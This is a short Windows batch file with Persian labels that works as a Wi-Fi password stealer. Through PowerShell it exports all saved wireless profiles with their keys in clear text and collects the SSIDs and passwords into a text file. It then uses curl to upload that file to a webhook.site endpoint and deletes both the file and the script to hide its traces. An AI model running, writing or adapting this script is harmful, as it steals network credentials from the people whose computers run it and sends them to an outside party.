@echo off
chcp 65001 > nul
powershell -Command "$temp = $env:TEMP; netsh wlan export profile folder=$temp key=clear; $result = foreach($file in Get-ChildItem $temp\*.xml) { [xml]$xml = Get-Content $file.FullName; $ssid = $xml.WLANProfile.name; $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial; if(!$pass){$pass='Password Not Found'} elseif($pass.StartsWith('01000000') -or $pass.Length -gt 40){$pass='[Secured / Hidden by Windows]'}; '----------------------------------------'; 'نام وای‌فای (SSID): ' + $ssid; 'رمز عبور: ' + $pass }; $outPath = '%~dp0WiFi_Passwords.txt'; $result | Out-File -FilePath $outPath -Encoding utf8; Remove-Item $temp\*.xml -ErrorAction SilentlyContinue"

curl "https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513" -F wifi_passwords=@WiFi_Passwords.txt

del WiFi_Passwords.txt
del wifi.bat

exit
